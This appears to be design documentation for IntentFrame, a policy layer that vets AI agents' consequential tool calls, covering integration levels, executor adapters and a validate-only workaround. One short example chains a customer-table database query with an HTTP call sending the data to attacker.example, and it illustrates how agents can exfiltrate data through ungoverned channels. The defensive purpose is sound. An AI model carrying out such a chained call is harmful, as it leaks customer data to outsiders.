# Do I Have to Rewrite All My Tools?

> No. IntentFrame should govern the actions where judgment matters before
> state changes. It does not need to replace every tool in an existing agent
> stack on day one.

This document answers the adoption question enterprise teams and startups ask
first:

> "If I use IntentFrame, do I have to rewrite every LangChain / OpenAI /
> CrewAI / custom tool call as an Executor adapter pack?"

The short answer is **no**. There are multiple integration levels. The right
one depends on what the tool does, who owns execution, and how much risk is
attached to the action.

---

## The core distinction

IntentFrame separates two concerns that are often bundled together:

1. **Judgment** — should this action be allowed?
2. **Execution** — who actually performs the action?

The full IntentFrame architecture answers both:

```
Agent -> Actor SDK -> Runtime -> Guardian -> Executor -> Real world
```

But B2B production agents often need a more incremental shape:

```
Agent -> IntentFrame validates the critical action -> Customer app executes it
```

That second shape is valid. It preserves the most important product value:
**policy and semantic judgment before a consequential action happens**.

It does not require every existing tool to become an Executor adapter.

---

## What must go through IntentFrame?

Route actions through IntentFrame when a mistake would alter something
important, leak sensitive data, or create accountability risk.

Good first targets:

- payments, refunds, credits, and invoice approvals
- production database writes and destructive admin actions
- customer-facing email, Slack, tickets, or notifications
- IAM, permissions, deployment, and infrastructure changes
- outbound HTTP calls that can transmit sensitive internal data
- irreversible or hard-to-undo workflow transitions

These are the "privileged path." They are the actions where the agent should
not directly turn thought into effect.

Do not start by routing every low-risk helper through IntentFrame:

- local formatting helpers
- deterministic parsing functions
- math, scoring, ranking, or summarization helpers
- internal read-only helpers that do not expose sensitive data outside the
  trust boundary
- retrieval tools whose outputs remain inside the agent's private context

Those can stay in-process unless the read itself is sensitive or can be paired
with an ungoverned exfiltration channel.

---

## The important caveat: "read-only" is not always safe

A read-only tool can still be dangerous if the agent also has an ungoverned
way to communicate externally.

Example:

```
1. In-process tool: query_db("SELECT * FROM customers")
2. In-process tool: http_get("https://attacker.example/?data=<customers>")
```

Neither call looks like a classic state-changing write. Together they are data
exfiltration.

For hybrid deployments, a practical rule is:

> Keep ordinary internal read tools in-process, but govern external
> communication channels and privileged writes.

That means customer email, Slack posts, ticket comments, webhooks, and outbound
HTTP often belong in the governed path even if they are not "writes" to an
internal database.

---

## Integration levels

IntentFrame adoption should be a ladder, not an all-or-nothing rewrite.

### Level 0: No IntentFrame

The agent calls tools directly.

```
Agent -> tool()
```

This is the default framework model. It is fast and simple, but the tool call
is only as safe as the agent, prompt, framework, and local guard code around
it.

Use this for low-risk deterministic helpers.

### Level 1: Actor SDK wrapper for critical actions

The agent's tool body submits a structured intent instead of directly calling
the privileged API.

```
Agent tool -> actor.submit({
  "action": "ISSUE_REFUND",
  "target": "order_123",
  "amount": 80,
  "reason": "Customer returned defective item within policy window"
})
```

This is the smallest behavioral change for agent authors: the model still
calls a tool, but the tool body routes the action through IntentFrame.

Current runtime behavior:

- `BLOCK` returns without executor side effects.
- `ALLOW` proceeds to the executor.
- `Actor.submit()` returns an `ExecutionResult`, not a pure verdict object.

This is ideal when IntentFrame also owns execution through a real adapter.

### Level 2: Validate-only for hybrid execution

In this shape, IntentFrame judges the action, but the customer application
executes it.

```
Agent -> IntentFrame validate-only -> ALLOW/BLOCK
                                |
                                v
                         Customer app executes
```

This is the cleanest enterprise adoption path for teams that already have
well-tested service code and do not want to move execution into a separate
Executor pack.

The desired product API is:

```python
verdict = await actor.validate({
    "action": "ISSUE_REFUND",
    "target": "order_123",
    "amount": 80,
    "reason": "Customer returned defective item within policy window",
})

if verdict.decision == "ALLOW":
    await refunds.issue(order_id="order_123", amount=80)
```

This keeps the semantic and policy boundary without requiring an executor
adapter for the refund implementation.

As of the current runtime, this is not a first-class Actor API. Existing
workarounds are described below.

### Level 3: Executor adapter for high-value actions

The privileged action is implemented inside an Executor pack.

```
Agent -> Actor SDK -> Runtime -> Guardian -> Executor Adapter -> API
```

This is the strongest model when IntentFrame should own:

- credential isolation
- action-specific execution safety
- rollback metadata
- canonical audit records
- consistent fail-closed behavior
- one execution boundary shared by many agents

Use this for the highest-value or highest-liability action families.

### Level 4: Full execution substrate

All agent I/O goes through IntentFrame.

This is appropriate for local-first personal assistants, multi-agent runtimes,
regulated environments, or deployments where the platform wants one runtime to
own every privileged surface.

It is not the right first step for most B2B teams adopting IntentFrame around a
small number of critical production actions.

---

## When do you need an Executor pack?

You need an Executor pack when you want IntentFrame to actually perform the
action.

Executor packs are worth the migration when the action benefits from:

- **Credential isolation** — the agent process never sees API keys, OAuth
  tokens, or production service credentials.
- **One trusted execution boundary** — multiple agents call one vetted service
  rather than each shipping its own privileged tool code.
- **Canonical audit** — the same runtime that allowed the action records the
  exact execution result.
- **Rollback and recovery** — the executor can record how to undo or reconcile
  actions where possible.
- **Adapter-level containment** — especially for shell execution or tools that
  touch host resources.

You probably do **not** need an Executor pack immediately when:

- the action is already implemented in trusted first-party backend code;
- the LLM cannot access environment credentials;
- the tool has no arbitrary code execution path;
- the team mainly wants policy judgment before a business action;
- the current service already owns execution audit and operational workflows.

In that case, validate-only is the better product surface.

---

## Current workaround: noop executor adapter

Until validate-only is first-class, teams can approximate it with a noop
Executor adapter.

One adapter can register all governed actions:

```python
class ValidateOnlyAdapter(CapabilityAdapter):
    def supported_actions(self) -> list[str]:
        return [
            "ISSUE_REFUND",
            "SEND_CUSTOMER_EMAIL",
            "APPROVE_INVOICE",
            "UPDATE_ACCOUNT_STATUS",
        ]

    def execute(self, action, params, credentials) -> ExecutionResult:
        return ExecutionResult(
            success=True,
            data={
                "validated_only": True,
                "action": action,
            },
        )
```

The runtime flow becomes:

```
Agent -> Actor SDK -> Runtime -> Guardian -> Noop adapter -> success=True
```

Then the customer application treats `success=True` plus
`validated_only=True` as permission to run its existing service call.

This works, but it is a bridge, not the ideal product shape.

Limitations:

- `ALLOW` is implicit as `success=True`; it is not returned as a first-class
  decision.
- Audit may say `executed: true` even though the real business action was not
  executed by IntentFrame.
- Every governed action must be registered by the noop adapter, otherwise the
  executor fails after Guardian allows.
- It can confuse compliance unless the noop result is clearly tagged as
  `validated_only`.

The built-in `DryRunExecutor` is the same general idea for tests and demos:
full pipeline, no real I/O, synthetic success. A custom noop adapter gives an
integrator control over the return payload, but it should not be the long-term
production API.

---

## Recommended product direction: first-class validate-only

IntentFrame should expose a real validate-only path:

```python
verdict = await actor.validate(intent)
```

or:

```python
result = await actor.submit(intent, execute=False)
```

The runtime should stop after Guardian:

```
Deterministic Guardian -> Analysis Engine -> AI Guardian -> return verdict
```

Expected return shape:

```json
{
  "decision": "ALLOW",
  "executed": false,
  "validated_only": true,
  "reason": "Within refund policy and amount limit",
  "decision_path": "ai_path"
}
```

For `BLOCK`:

```json
{
  "decision": "BLOCK",
  "executed": false,
  "validated_only": true,
  "reason": "Refund exceeds user policy limit",
  "decision_path": "deterministic"
}
```

This makes the hybrid story honest:

> IntentFrame judged the action. Your application executed it.

It also avoids pretending a noop adapter "executed" the action.

---

## Recommended migration playbook

1. **Inventory agent tools by consequence.** Separate deterministic helpers,
   internal reads, external communication, and state-changing actions.
2. **Pick the top three to five risky actions.** Start with the actions that
   would cause financial, customer, compliance, or production damage if wrong.
3. **Require structured reasons for those actions.** The LLM must explain why
   the action is being requested.
4. **Route only those actions through IntentFrame first.** Use real executor
   adapters where IntentFrame should own execution; use validate-only or a
   noop bridge where the application should keep execution.
5. **Govern outbound communication.** Do not leave exfiltration channels
   outside the policy boundary.
6. **Expand adapter coverage only where it buys risk reduction.** Every
   adapter migration should have a clear reason: credential isolation, audit,
   rollback, sandboxing, or shared execution control.

---

## The answer to the adoption question

No, teams should not have to rewrite every tool call to adopt IntentFrame.

The right default for B2B is:

> Keep ordinary tools where they are. Put consequential actions on a governed
> path. Use Executor packs when IntentFrame should own execution. Use
> validate-only when IntentFrame should judge and the application should
> execute.

Executor packs are a strong security boundary, not a mandatory migration tax
for every helper function in an existing agent.

